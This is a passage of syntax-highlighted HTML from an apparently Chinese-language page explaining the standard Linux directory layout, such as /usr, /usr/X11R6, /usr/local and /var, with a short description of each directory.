class=\"crayon-h\"> </span>当建立一个新用户账号时，此目录下的文件通常被复制到用户的主目录下。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-12\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">X11X11 </span><span class=\"crayon-e\">window </span><span class=\"crayon-i\">system</span>所需的配置文件。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-13\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">home</span><span class=\"crayon-h\"> </span>在<span class=\"crayon-i\">Linux</span>机器上，用户主目录通常直接或间接地置在此目录下。其结构通常由本地机的管理员来决定。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-14\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">lib</span><span class=\"crayon-h\"> </span>此目录下包含系统引导和在根用户执行命令所必需用到的共享库。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-15\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">mnt</span><span class=\"crayon-h\"> </span>挂载临时文件系统的挂载点。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-16\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">proc</span><span class=\"crayon-h\"> </span>这是提供运行过程和核心文件系统<span class=\"crayon-h\"> </span><span class=\"crayon-i\">proc</span><span class=\"crayon-h\"> </span>挂载点。这一”伪”文件系统在以下章节中详细叙述<span class=\"crayon-h\"> </span><span class=\"crayon-e\">proc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">)</span>。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-17\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">sbin</span><span class=\"crayon-h\"> </span>类似于<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">bin</span><span class=\"crayon-h\"> </span>此目录保存了系统引导所需的命令，但这些命令一般使用者不能执行。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-18\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">tmp</span><span class=\"crayon-h\"> </span>此目录用于保存临时文件，临时文件在日常维护或在系统启动时无需通知便可删除</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-19\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">usr</span><span class=\"crayon-h\"> </span>此目录通常用于从一个独立的分区上挂载文件。它应保存共享只读类文件，这样它可以被运行<span class=\"crayon-i\">Linux</span>的不同主机挂载。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-20\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">X11R6</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Window</span>系统<span class=\"crayon-h\"> </span><span class=\"crayon-i\">Version</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">release</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-21\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">X11R6</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">bin</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Windows</span>系统使用的二进制文件；通常是在对更传统的<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">X11</span><span class=\"crayon-h\"> </span>中文件的符号连接。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-22\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">X11R6</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">lib</span><span class=\"crayon-h\"> </span>保存与<span class=\"crayon-v\">X</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Windows</span>系统关数据文件。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-23\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">X11R6</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">X11</span><span class=\"crayon-h\"> </span>此目录保存与运行<span class=\"crayon-v\">X</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Windows</span>系统关其他文件。通常是对来自<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">X11</span><span class=\"crayon-h\"> </span>中文件的符号连接。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-24\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">X11R6</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">X11</span><span class=\"crayon-h\"> </span>此目录保存包括使用<span class=\"crayon-i\">X11</span>窗口系统进行编译程序所需的文件。通常是对来自<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">X11</span><span class=\"crayon-h\"> </span>中文件的符号连接。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-25\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">bin</span><span class=\"crayon-h\"> </span>这是执行程序的主要目录，其中的绝大多数为一般使用者使用，除了那些启动系统或修复系统或不是本地安装的程序一般都放在此目录下。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-26\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">X11</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-27\"><span class=\"crayon-i\">X11</span>执行文件放置的地方；在<span class=\"crayon-i\">Linux</span>系统中，它通常是对<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">X11R6</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span>符号连接表</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-28\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">dict</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-29\">此目录保存拼写检查器所使用的词汇表文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-30\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">doc</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-31\">此目录下应可以找到那些已安装的软件文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-32\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">etc</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-33\">此目录可用来那些存放整个网共享的配置文件。然而那可执行命令指向总是使用参照使用<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">etc</span><span class=\"crayon-h\"> </span>目录下的文件。<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">etc</span><span class=\"crayon-h\"> </span>目录下连接文件应指向<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span>目录下适当的文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-34\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">include</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-35\"><span class=\"crayon-i\">C</span>程序语言编译使用的<span class=\"crayon-i\">Include</span>”包括”文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-36\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">X11</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-37\"><span class=\"crayon-i\">C</span>程序语言编译和<span class=\"crayon-v\">X</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Windows</span>系统使用的<span class=\"crayon-h\"> </span><span class=\"crayon-i\">Include</span>”包括”文件。它通常中指向<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">X11R6</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">X11</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span>符号连接表。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-38\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">asm</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-39\">申明汇编函数的<span class=\"crayon-i\">Include</span>”包括”文件，它通常是指向<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">src</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">linux</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">asm</span><span class=\"crayon-h\"> </span>目录的符号连接</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-40\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">linux</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-41\">包含系统变更的信息通常是指向<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">src</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">linux</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">linux</span><span class=\"crayon-h\"> </span>目录的符号连接表，来获得操作系统特定信息。<span class=\"crayon-sy\">(</span>注：使用者应在此自行包含那些保证自己开发的程序正常运行所需的<span class=\"crayon-i\">libc</span><span class=\"crayon-h\"> </span>函数库。不管怎样，<span class=\"crayon-i\">Linux</span>核心系统不是设计用来执行直接运行用户程序的，它并不知道用户程序需要使用哪个版本的<span class=\"crayon-i\">libc</span>库<span class=\"crayon-h\"> </span>。如果你随意将<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">asm</span><span class=\"crayon-h\"> </span>和<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">linux</span><span class=\"crayon-h\"> </span>指向一个系统核心，系统很可能崩溃。<span class=\"crayon-i\">Debian</span>系统不这么做。它使用<span class=\"crayon-h\"> </span><span class=\"crayon-e \">libc*</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">dev</span>运行包中提供的核心系统标识，以保证启动所正确的文件。<span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-42\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">++</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-43\"><span class=\"crayon-i\">GNU</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-o\">++</span>编译程序所使用的<span class=\"crayon-i\">Include</span>”包括”文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-44\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">lib</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-45\">目标库文件，包括动态连接库加上一些通常不是直接调用的可执行文件案。一些复杂的程序可能在此占用整个子目录。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-46\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">X11</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-47\">存放<span class=\"crayon-i\">X</span>系统数据文件及系统配置文件的地方。<span class=\"crayon-h\"> </span><span class=\"crayon-i\">Linux</span>中通常是指向<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">X11R6</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">X11</span><span class=\"crayon-h\"> </span>目录的符号连接表。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-48\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">gcc</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">lib</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-49\"><span class=\"crayon-i\">GNU</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">C</span><span class=\"crayon-h\"> </span>编译程序所使用的可执行文件案和”包括”文件。<span class=\"crayon-h\"> </span><span class=\"crayon-e\">gcc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-50\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">groff</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-51\"><span class=\"crayon-e\">GNU </span><span class=\"crayon-i\">groff</span><span class=\"crayon-h\"> </span>文件格式系统所使用的文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-52\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">uucp</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-53\"><span class=\"crayon-e\">uucp</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>所使用的文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-54\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">zoneinfo</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-55\">关时区信息文件文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-56\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">local</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-57\">安装在本地执行程序的地方。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-58\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">bin</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-59\">在此地放置本地执行程序的二进制文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-60\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">doc</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-61\">放置本地文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-62\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">etc</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-63\">安装在本地程序的配置文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-64\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">lib</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-65\">安装在本地程序的库文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-66\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">info</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-67\">安装在本地程序关信息文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-68\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">man</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-69\">安装在本地程序使用手册。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-70\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">sbin</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-71\">安装在本地的系统管理程序。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-72\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">src</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-73\">安装在本地程序的原始码。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-74\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">man</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-75\">手册页通常放在此目录，或相关子目录下。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-76\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">man</span><span class=\"crayon-c\">//man[1-9]</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-77\">此目录在指定的地方以原始码形式存放手册页。系统在所的手册页中使用自己独特的语言及代码集，可能会省略<span class=\"crayon-h\"> </span><span class=\"crayon-i\">substring</span><span class=\"crayon-h\"> </span>子字符串。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-78\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">sbin</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-79\">此目录保存系统管理程序的二进制码，这些文件不是系统启动或文件系统挂载<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">usr</span><span class=\"crayon-h\"> </span>目录或修复系统所必需的。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-80\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">share</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-81\">在此目录下不同的子目录中保存了同一个操作系统在不同构架下工作时特定应用程序的共享数据。使用者可以找到通常放在<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">doc</span><span class=\"crayon-h\"> </span>或<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">lib</span><span class=\"crayon-h\"> </span>或<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">man</span><span class=\"crayon-h\"> </span>目录下的这些数据。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-82\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">src</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-83\">系统不同组成部份的源文件包括参考数据报。不要将你自己与项目关的文件放这里，因为在安装软件外，<span class=\"crayon-o\">/</span><span class=\"crayon-i\">usr</span>下的文件属性除通常设为只读。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-84\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">src</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">linux</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-85\">系统核心资源通常拆包安装于此。这是系统中重要的一环，因为<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">include</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">linux</span><span class=\"crayon-h\"> </span>符号连接表指向此目录。你应当使用其他目录来来编译建立新核心。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-86\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">tmp</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-87\">此目录不再使用了。它应指向目录<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">tmp</span>。<span class=\"crayon-h\"> </span>这个链接只是出于系统兼容的目的，一般不再使用。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-88\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-89\">此目录下文件的大小可能会改变，如缓冲文件可日志文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-90\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">adm</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-91\">此目录为<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">log</span><span class=\"crayon-h\"> </span>甩替代，通常是指向<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">log</span><span class=\"crayon-h\"> </span>的符号连接表。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-92\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">backups</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-93\">此目录用来存放重要系统文件的后备文件</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-94\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">catman</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cat</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cache</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">man</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cat</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-95\">此目录存储根据手册分类预先格式化的参考手册页。<span class=\"crayon-sy\">(</span>这些参考手册页是相互独立的<span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-96\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">lock</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-97\">此目录存储锁定文件。依据命名习惯，设备锁定文件是<span class=\"crayon-h\"> </span><span class=\"crayon-e\">LCKxxxxx </span><span class=\"crayon-i\">xxxxx</span>与在文件系统中该设备名相同，使用的格式是<span class=\"crayon-e\">HDU </span><span class=\"crayon-i\">UUCP</span>锁定文件，例如包含进程标识<span class=\"crayon-i\">PID</span>的锁定文件是一个<span class=\"crayon-cn\">10</span>字节的<span class=\"crayon-i\">ASCII</span>格式的数字，后面跟一个换行符。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-98\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">log</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-99\">各种日志文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-100\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">preserve</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-101\">这是<span class=\"crayon-h\"> </span><span class=\"crayon-e\">vi</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>存放正在编辑中的文件，以便以后可以恢复。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-102\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">run</span></div><div class=\"crayon-line\" 